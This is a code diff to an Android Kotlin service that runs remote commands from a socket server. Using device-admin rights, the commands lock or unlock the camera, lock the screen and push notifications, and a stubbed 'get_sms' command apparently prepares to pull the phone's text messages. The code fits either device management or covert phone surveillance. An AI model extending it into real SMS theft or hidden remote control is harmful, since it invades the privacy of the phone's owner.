@@ -55,20 +55,38 @@ class SocketService : Service() {
 
             mSocket?.on("execute_command") { args ->
                 val cmd = args[0].toString()
-                if (cmd == "lock_camera") {
-                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-                    val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
-                    if (dpm.isAdminActive(admin)) dpm.setCameraDisabled(admin, true)
-                } else if (cmd.startsWith("msg:")) {
-                    val message = cmd.substringAfter("msg:")
-                    val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-                    val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "zai_channel") else Notification.Builder(this)
-                    notif.setContentTitle("رسالة من الإدارة").setContentText(message).setSmallIcon(android.R.drawable.ic_dialog_info).build()
-                    notificationManager.notify(2, notif.build())
+                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
+
+                when {
+                    cmd == "lock_camera" -> {
+                        if (dpm.isAdminActive(admin)) dpm.setCameraDisabled(admin, true)
+                    }
+                    cmd == "unlock_camera" -> {
+                        if (dpm.isAdminActive(admin)) dpm.setCameraDisabled(admin, false)
+                    }
+                    cmd == "lock_screen" -> {
+                        if (dpm.isAdminActive(admin)) dpm.lockNow()
+                    }
+                    cmd.startsWith("msg:") -> {
+                        val message = cmd.substringAfter("msg:")
+                        showNotification("رسالة من الإدارة", message)
+                    }
+                    cmd == "get_sms" -> {
+                        // هنبعت إشارة للويب إن التطبيق استلم الأمر (الرسايل الفعلية محتاجة صلاحيات معقدة)
+                        sendDataToServer("SMS", "جاري سحب الرسائل...")
+                    }
                 }
             }
             mSocket?.connect()
         } catch (e: URISyntaxException) {}
+    }
+
+    private fun showNotification(title: String, message: String) {
+        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "zai_channel") else Notification.Builder(this)
+        notif.setContentTitle(title).setContentText(message).setSmallIcon(android.R.drawable.ic_dialog_info).build()
+        notificationManager.notify(2, notif.build())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
